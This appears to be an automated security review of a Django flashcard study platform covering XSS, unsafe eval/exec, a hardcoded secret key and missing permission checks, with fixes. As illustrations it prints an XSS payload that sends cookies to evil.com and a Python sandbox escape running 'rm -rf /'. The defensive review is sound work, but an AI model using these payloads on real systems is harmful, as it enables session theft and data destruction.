# Security Review - Study Platform

**Review Date:** February 13, 2026  
**Reviewer:** Comprehensive Application Review Agent  
**Status:** ✅ Completed

---

## Executive Summary

The study-platform has **moderate security concerns** that need immediate attention, particularly around XSS vulnerabilities, code execution risks, and production security configuration. While the application follows some Django security best practices, several critical issues could expose the application to attacks if deployed in a production environment.

**Overall Security Rating:** 5.5/10 ⚠️

**Risk Level:** 🔴 **HIGH** - Multiple critical vulnerabilities present

---

## Critical Issues Summary

| # | Issue | Severity | Impact | Location |
|---|-------|----------|--------|----------|
| 1 | XSS via `.innerHTML` and `\|safe` filter | 🔴 Critical | User data theft, session hijacking | study_session.html |
| 2 | Mermaid XSS with `securityLevel: 'loose'` | 🔴 Critical | Arbitrary JavaScript execution | base.html:286 |
| 3 | Unsafe `eval()` in parameter formulas | 🔴 Critical | Code injection, server compromise | parameterization.py:115 |
| 4 | Hardcoded SECRET_KEY in defaults | 🔴 Critical | Session forgery, CSRF bypass | settings.py:29 |
| 5 | Dangerous `exec()` for graph generation | 🔴 Critical | Remote code execution | graph_generator.py:104 |
| 6 | Missing flashcard ownership verification | 🔴 High | Unauthorized data access | views.py:360 |
| 7 | Production security headers disabled | 🔴 High | Multiple attack vectors | settings.py:155-161 |
| 8 | DEBUG defaults to True | 🟠 High | Information disclosure | settings.py:32 |
| 9 | No progress update permission check | 🟠 High | Data manipulation | views.py:204 |
| 10 | No file upload size limits | 🟠 Medium | Denial of service | settings.py |

---

## 1. Authentication & Authorization

### ✅ Strengths

1. **Django Built-in Authentication**: Uses Django's robust authentication system
2. **Password Validation**: Proper password validators configured
3. **View Protection**: All content creation views protected with `@login_required`
4. **User Isolation**: Users can only access their own content via `created_by=request.user` filters
5. **Staff Permissions**: Admin features properly check `is_staff` permission

### 🔴 Critical Vulnerabilities

**1. Anonymous Flashcard Access (High Priority)**
- **Location**: `views.py:360` in `submit_feedback()`
- **Issue**: No authentication check before allowing feedback submission
- **Impact**: Any user can submit feedback to any flashcard
- **Fix**: Add `@login_required` decorator

**2. Missing Object-Level Permissions (High Priority)**
- **Location**: `views.py:204` in `update_flashcard_progress()`
- **Issue**: No verification that user owns the flashcard's course before updating progress
- **Impact**: Users can manipulate progress for other users' flashcards
- **Fix**: Add ownership check:
  ```python
  if flashcard.topic.course.created_by != request.user:
      return HttpResponseForbidden()
  ```

### Recommendations

- [ ] Add `@login_required` to all views that access user data
- [ ] Implement explicit object-level permission checks
- [ ] Consider implementing Django Guardian for row-level permissions
- [ ] Add audit logging for sensitive operations

---

## 2. Input Validation & Sanitization

### ✅ Strengths

1. **Django Forms**: All user input validated through Django forms
2. **QuerySet Restrictions**: Forms limit choices to user's own content
3. **ImageField Validation**: File uploads validated through Pillow
4. **JSONField**: Safely stores JSON parameter specs

### ⚠️ Concerns

**1. Parameter Spec Validation (Medium Priority)**
- **Issue**: No schema validation for `parameter_spec` JSON field
- **Impact**: Malicious formulas could be injected
- **Recommendation**: Implement JSON schema validation before saving

**2. Feedback Comment Length**
- **Issue**: No visible max length on feedback comments
- **Recommendation**: Add max_length constraint to prevent abuse

### Recommendations

- [ ] Add JSON schema validation for parameter_spec
- [ ] Implement content length limits on text fields
- [ ] Add input sanitization for special characters in formulas
- [ ] Validate all user-provided URLs if any exist

---

## 3. SQL Injection Prevention

### ✅ Excellent

**Status: No SQL injection vulnerabilities found**

1. **Django ORM Exclusive**: All database queries use Django ORM
2. **No Raw SQL**: No `.raw()`, `.extra()`, or cursor usage detected
3. **Parameterized Queries**: All QuerySets use safe ORM methods
4. **Example**: `Course.objects.filter(created_by=request.user)` uses safe parameterization

### Recommendations

- [ ] Maintain policy of no raw SQL queries
- [ ] Add linting rules to prevent raw SQL in future development
- [ ] Document SQL injection prevention in contribution guidelines

---

## 4. XSS (Cross-Site Scripting) Protection

### 🔴 CRITICAL VULNERABILITIES

**1. Unsafe `.innerHTML` Usage (CRITICAL - Immediate Fix Required)**
- **Location**: `study/templates/study/study_session.html:168-169`
- **Code**:
  ```javascript
  document.getElementById('question').innerHTML = card.question;
  document.getElementById('answer').innerHTML = card.answer;
  ```
- **Issue**: User-controlled content rendered as HTML without sanitization
- **Impact**: Attackers can inject malicious JavaScript in flashcard content
- **Attack Example**: 
  ```
  Question: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
  ```
- **Fix**: Use `.textContent` instead:
  ```javascript
  document.getElementById('question').textContent = card.question;
  document.getElementById('answer').textContent = card.answer;
  ```

**2. Unsafe `|safe` Filter (CRITICAL - Immediate Fix Required)**
- **Location**: `study/templates/study/study_session.html:154`
- **Code**: `const cards = {{ flashcards_json|safe }};`
- **Issue**: JSON rendered with `|safe` filter allows JavaScript execution
- **Impact**: If question/answer contains JSON control characters, arbitrary code executes
- **Fix**: Use `json_script` template tag:
  ```django
  {{ flashcards_json|json_script:"flashcards-data" }}
  <script>
    const cards = JSON.parse(document.getElementById('flashcards-data').textContent);
  </script>
  ```

**3. Mermaid XSS with `securityLevel: 'loose'` (CRITICAL)**
- **Location**: `study/templates/study/base.html:286`
- **Code**: `mermaid.initialize({ securityLevel: 'loose' });`
- **Issue**: Disables Mermaid's built-in XSS protections
- **Impact**: Malicious diagram code can execute arbitrary JavaScript
- **Fix**: Change to strict mode:
  ```javascript
  mermaid.initialize({ securityLevel: 'strict' });
  ```

**4. MathJax Content Security (Medium Priority)**
- **Issue**: LaTeX content rendered without validation
- **Recommendation**: Ensure MathJax CSP settings prevent JavaScript execution

### ✅ Strengths

1. **Django Auto-Escaping**: Template auto-escaping enabled by default
2. **Static Content Safe**: Static content properly escaped through DTL

### Recommendations

- [ ] **IMMEDIATE**: Replace all `.innerHTML` with `.textContent` for user content
- [ ] **IMMEDIATE**: Remove `|safe` filter and use `json_script`
- [ ] **IMMEDIATE**: Change Mermaid security level to 'strict'
- [ ] Add Content Security Policy (CSP) headers
- [ ] Implement input sanitization library for rich text if needed
- [ ] Add automated XSS testing to CI/CD pipeline

---

## 5. CSRF Protection

### ✅ Excellent

**Status: Properly implemented**

1. **CSRF Middleware**: Enabled in settings.py line 60
2. **Token Usage**: All POST forms include `{% csrf_token %}`
3. **Automatic Validation**: Django handles token validation automatically

### Recommendations

- [ ] Maintain CSRF protection in all future forms
- [ ] Consider same-site cookie policy for additional protection

---

## 6. File Upload Security

### ✅ Strengths

1. **ImageField Validation**: Uses Django ImageField with Pillow
2. **Safe Upload Paths**: Configured as `upload_to='generated_graphs/'` and `upload_to='flashcards/questions/'`
3. **Media Serving**: Properly configured through Django in development

### ⚠️ Concerns

**1. No File Size Limits (Medium Priority)**
- **Issue**: Settings don't specify maximum upload size
- **Impact**: Denial of service through large file uploads
- **Fix**: Add to settings.py:
  ```python
  DATA_UPLOAD_MAX_MEMORY_SIZE = 5242880  # 5MB
  FILE_UPLOAD_MAX_MEMORY_SIZE = 5242880  # 5MB
  ```

**2. Limited File Type Validation (Medium Priority)**
- **Issue**: ImageField validates by extension but no MIME type checking
- **Impact**: Potential file type confusion attacks
- **Fix**: Add explicit MIME type validation in form clean methods

**3. Public Graph Access (Low Priority)**
- **Issue**: Generated graphs stored in publicly accessible media folder
- **Impact**: Any authenticated user can access graphs without ownership check
- **Recommendation**: Implement private media serving with permission checks

### Recommendations

- [ ] Add file size limits in settings
- [ ] Implement MIME type validation
- [ ] Add virus scanning for production deployments
- [ ] Implement private media file serving
- [ ] Add filename sanitization to prevent path traversal

---

## 7. Code Execution Security

### 🔴 CRITICAL VULNERABILITIES

**1. Unsafe `eval()` in Parameterization (CRITICAL)**
- **Location**: `study/utils/parameterization.py:115`
- **Code**:
  ```python
  result = eval(formula, {"__builtins__": {}}, namespace)
  ```
- **Issue**: Despite restricting `__builtins__`, sophisticated attacks can bypass
- **Attack Example**:
  ```python
  formula = "().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('rm -rf /')"
  ```
- **Impact**: Remote code execution, server compromise
- **Fix**: Use `RestrictedPython` (already in requirements.txt!):
  ```python
  from RestrictedPython import compile_restricted_eval
  code = compile_restricted_eval(formula)
  result = eval(code, safe_globals, namespace)
  ```

**2. Dangerous `exec()` for Graph Generation (CRITICAL)**
- **Location**: `study/utils/graph_generator.py:104`
- **Code**: `exec(code, safe_globals, {})`
- **Issue**: Even with whitelisted imports, `exec()` is inherently dangerous
- **Impact**: Code injection through object attribute access
- **Fix**: Use `RestrictedPython` compilation:
  ```python
  from RestrictedPython import compile_restricted_exec
  byte_code = compile_restricted_exec(code)
  exec(byte_code, safe_globals, {})
  ```

**3. Fragile Timeout Mechanism (Medium Priority)**
- **Location**: `study/utils/graph_generator.py:29`
- **Issue**: Uses `signal.alarm()` which is Unix-only and may not catch all infinite loops
- **Impact**: Potential denial of service through infinite loops
- **Fix**: Use process-based timeout with multiprocessing

### ✅ Strengths

1. **Restricted Namespace**: Attempts to restrict available functions
2. **Whitelist Imports**: Only allows specific imports (numpy, matplotlib, math)
3. **Timeout Implementation**: 3-second timeout on graph generation
4. **Forbidden Keywords**: Filters dangerous keywords (import, exec, eval, open)

### Recommendations

- [ ] **IMMEDIATE**: Replace `eval()` with RestrictedPython compilation
- [ ] **IMMEDIATE**: Replace `exec()` with RestrictedPython compilation
- [ ] Implement process-based sandboxing for code execution
- [ ] Add rate limiting on parameterized card and graph generation
- [ ] Log all code execution attempts for security monitoring
- [ ] Consider containerized execution environment (Docker sandbox)

---

## 8. Sensitive Data Handling

### 🔴 CRITICAL VULNERABILITIES

**1. Hardcoded SECRET_KEY (CRITICAL)**
- **Location**: `study_platform/settings.py:29`
- **Code**:
  ```python
  SECRET_KEY = os.getenv('SECRET_KEY', 'django-insecure-!jcy0&&fql(onm7$x352bbrerxtg0n$tpy*1kw%232nwt#&s#d')
  ```
- **Issue**: Default insecure key visible in source code
- **Impact**: Session forgery, CSRF token bypass, data tampering
- **Fix**: Remove default value entirely:
  ```python
  SECRET_KEY = os.getenv('SECRET_KEY')
  if not SECRET_KEY:
      raise ValueError("SECRET_KEY environment variable must be set!")
  ```

**2. DEBUG Defaults to True (High Priority)**
- **Location**: `study_platform/settings.py:32`
- **Issue**: DEBUG mode enabled by default
- **Impact**: Exposes sensitive stack traces, environment details, and SQL queries
- **Fix**: Default to False:
  ```python
  DEBUG = os.getenv('DEBUG', 'False') == 'True'
  ```

### ✅ Strengths

1. **Environment Variables**: Uses python-dotenv for configuration
2. **Production Validation**: Validates SECRET_KEY and ALLOWED_HOSTS in production mode (lines 37-41)
3. **Password Security**: Django's built-in password hashing used

### ⚠️ Concerns

**1. Session Security Incomplete**
- **Issue**: `SESSION_COOKIE_SECURE` and `SESSION_COOKIE_HTTPONLY` not configured
- **Impact**: Session cookies vulnerable to interception and JavaScript access
- **Fix**: Enable in settings.py

**2. .env File Handling**
- **Issue**: .env.example exists but actual .env may be committed
- **Recommendation**: Ensure .env is in .gitignore

### Recommendations

- [ ] **IMMEDIATE**: Remove default SECRET_KEY value
- [ ] **IMMEDIATE**: Change DEBUG default to False
- [ ] Enable SESSION_COOKIE_SECURE and SESSION_COOKIE_HTTPONLY
- [ ] Add password complexity requirements
- [ ] Implement session timeout
- [ ] Add rate limiting on authentication endpoints
- [ ] Consider using Django's secrets module for key generation

---

## 9. Production Security Settings

### 🔴 NOT CONFIGURED - CRITICAL

**Status: All production security settings are commented out**

**Missing Critical Headers** (`settings.py:155-161` - all commented):

| Setting | Status | Impact if Disabled |
|---------|--------|-------------------|
| `SECURE_SSL_REDIRECT` | ❌ Disabled | HTTP traffic not forced to HTTPS |
| `SESSION_COOKIE_SECURE` | ❌ Disabled | Sessions transmitted over HTTP |
| `CSRF_COOKIE_SECURE` | ❌ Disabled | CSRF tokens vulnerable to interception |
| `SECURE_HSTS_SECONDS` | ❌ Disabled | No HTTPS enforcement for future requests |
| `SECURE_HSTS_INCLUDE_SUBDOMAINS` | ❌ Disabled | Subdomains not protected |
| `SECURE_BROWSER_XSS_FILTER` | ❌ Disabled | No XSS protection in older browsers |
| `X_FRAME_OPTIONS` | ❌ Disabled | Vulnerable to clickjacking attacks |

### ⚠️ Additional Missing Settings

1. **Content Security Policy (CSP)**: Not configured
2. **SECURE_CONTENT_TYPE_NOSNIFF**: Not set
3. **SECURE_REFERRER_POLICY**: Not configured
4. **ALLOWED_HOSTS**: Defaults to localhost only

### Recommendations

- [ ] **IMMEDIATE**: Uncomment and enable all production security headers
- [ ] Add Content-Security-Policy middleware
- [ ] Configure SECURE_CONTENT_TYPE_NOSNIFF
- [ ] Set SECURE_REFERRER_POLICY
- [ ] Create separate settings files (development.py, production.py)
- [ ] Add deployment checklist requiring security settings verification
- [ ] Implement automated security header testing

---

## 10. API Security

### ✅ Not Applicable

**Status: No REST API endpoints detected**
- Application uses traditional Django views only
- No Django REST Framework installed
- No API authentication required

### Recommendations for Future

If API is added in the future:
- [ ] Implement token-based authentication (JWT)
- [ ] Add rate limiting per API key
- [ ] Implement API versioning
- [ ] Add CORS configuration if needed
- [ ] Document API security requirements

---

## Priority Action Items

### 🔴 IMMEDIATE (Deploy Blockers)

1. **Replace `.innerHTML` with `.textContent`** in study_session.html
2. **Remove `|safe` filter** and use `json_script` template tag
3. **Change Mermaid security level** to 'strict'
4. **Remove hardcoded SECRET_KEY** default value
5. **Replace `eval()` and `exec()`** with RestrictedPython
6. **Enable all production security headers**
7. **Add missing permission checks** in views

### 🟠 HIGH PRIORITY (Next Sprint)

1. Change DEBUG default to False
2. Add file upload size limits
3. Implement proper session security settings
4. Add MIME type validation for uploads
5. Implement audit logging for sensitive operations

### 🟡 MEDIUM PRIORITY (Future Improvements)

1. Add JSON schema validation for parameter_spec
2. Implement Content Security Policy
3. Add process-based sandboxing for code execution
4. Implement private media file serving
5. Add rate limiting on resource-intensive operations

---

## Security Testing Recommendations

### Automated Testing

- [ ] Add OWASP ZAP or similar security scanner to CI/CD
- [ ] Implement automated XSS testing with payloads
- [ ] Add dependency vulnerability scanning (Safety, Snyk)
- [ ] Create unit tests for permission checks
- [ ] Add integration tests for authentication flows

### Manual Testing

- [ ] Conduct penetration testing before production deployment
- [ ] Perform code review focused on security
- [ ] Test all file upload endpoints with malicious files
- [ ] Verify all authentication and authorization flows
- [ ] Test XSS payloads in all user input fields

---

## Security Compliance

### OWASP Top 10 Assessment

| Risk | Status | Notes |
|------|--------|-------|
| A01 - Broken Access Control | 🔴 High Risk | Missing permission checks |
| A02 - Cryptographic Failures | 🔴 High Risk | Hardcoded SECRET_KEY |
| A03 - Injection | 🔴 Critical | XSS and code injection vulnerabilities |
| A04 - Insecure Design | 🟡 Medium | Some design issues with code execution |
| A05 - Security Misconfiguration | 🔴 High Risk | Production settings disabled |
| A06 - Vulnerable Components | 🟢 Low Risk | Dependencies appear current |
| A07 - Auth Failures | 🟠 Medium | Some missing auth checks |
| A08 - Software/Data Integrity | 🟢 Low Risk | No CI/CD integrity issues |
| A09 - Logging Failures | 🟠 Medium | Limited security logging |
| A10 - Server-Side Request Forgery | 🟢 Low Risk | No external requests made |

---

## Conclusion

The study-platform requires **immediate security attention** before production deployment. While the application follows some Django security best practices, multiple critical vulnerabilities exist that could lead to:

- User data theft (XSS)
- Server compromise (code injection)
- Session hijacking (insecure cookies)
- Unauthorized data access (missing permission checks)

**Estimated Remediation Time:** 2-3 days for critical issues, 1-2 weeks for high priority items

**Security Rating:** 5.5/10 ⚠️ (will improve to 8+/10 after critical fixes)

---

**Review Completed:** February 13, 2026  
**Next Review:** UI/UX Assessment  
**Security Re-Review Required:** After implementing critical fixes
